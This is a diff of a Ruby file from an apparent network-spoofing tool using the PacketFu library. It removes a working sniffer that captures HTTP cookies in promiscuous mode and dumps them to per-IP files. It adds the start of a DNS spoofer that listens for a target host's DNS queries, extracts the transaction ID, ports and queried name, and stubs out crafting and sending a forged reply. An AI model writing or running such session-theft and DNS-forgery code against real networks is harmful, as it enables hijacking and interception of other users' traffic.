@@ -3,49 +3,74 @@ require 'rubygems'
 require 'packetfu'
 include PacketFu
 
-# This file contains the two functions that are used by the main program (cspoof.rb)
-
-# dump the cookies to a file in verbose mode 
-def puts_verbose(text, src_ip, dst_ip)
-    #generate the filename
-    user = File.open("cookie_#{src_ip}->#{dst_ip}.txt", "a") 
-    puts "File opened: #{user.path}"
-    user.puts "----------------------------------------------------"
-    user.puts(text)
-    user.close
+def puts_dns(text)
+  user = File.open("thing.txt", "a") 
+  puts "File opened!"
+  user.puts("---------------------")
+  user.puts(text)
+  user.puts(text.unpack('H*'))
+  user.close
 end
 
-def puts_dns(text, src_ip, dst_ip)
-  puts(text)
+def newDnsResponse()
+  # build most of a dns packet
 end
 
-# sniff the traffic and capture the cookie packets, and dump them to a file
-def cookie_grabber()
-  puts "Waiting for cookies............:"
-  capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true,
-  :filter => "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)")
+def finalizeDnsResponse()
+  # put in the id, ip, and src/dst ports
+end
 
-  capture_session.stream.each { |packet|
-  if packet =~ /ookie/
-    puts "cookie found!" 
-    pkt = Packet.parse packet
-    packet_info = [pkt.ip_saddr, pkt.ip_daddr]
-    src_ip = "%s" % packet_info
-    dst_ip = "%s" % packet_info
-    puts_verbose(packet, src_ip, dst_ip)
+
+def isQuery(packet)
+  dnsFlag = (packet.payload[2]).to_s + (packet.payload[3]).to_s
+  qryFlag = "\x01\x00"
+  if dnsFlag == qryFlag
+    return true
   end
-  }
+
+  return false
 end
 
-def dns_grabber()
+def dns_query_grabber()
   puts "Waiting for queries:"
-  capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => "udp and port 53", :save => true)
-  puts "got one!"
+  capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => "udp and port 53 and src " + $tIP, :save => true)
   capture_session.stream.each { |packet|
-    pkt = Packet.parse packet
-    packet_info = [pkt.ip_saddr, pkt.ip_daddr]
-    src_ip = "%s" % packet_info
-    dst_ip = "%s" % packet_info
-      puts_dns(packet, src_ip, dst_ip)
+    pkt = Packet.parse(packet)
+    if isQuery(pkt)
+
+      # get src and dst port from udp
+      udpSrc = pkt.udp_src
+      udpDst = pkt.udp_dst
+
+      # get transaction id from dns
+      queryID = pkt.payload[0, 2]
+      # puts(queryID.unpack('H*'))
+
+      name = ""
+      num = (pkt.payload[12]).to_s.ord    
+
+      k = 0
+      while num > 0 
+        for i in 1..num
+          name += pkt.payload[12+i+k]
+        end
+
+        k += num+1        
+        num = pkt.payload[12+k].to_s.ord
+        
+        if num != 0
+          name += '.'
+        end
+      end
+
+      puts "name: #{name}"
+      # get name from dns
+      # craft dns packet
+      # send dns packet
+      #finalizeDnsResponse()
+
+      # packet_info = [pkt.ip_saddr, pkt.ip_daddr]
+      # puts_dns(packet)
+    end
   }
 end
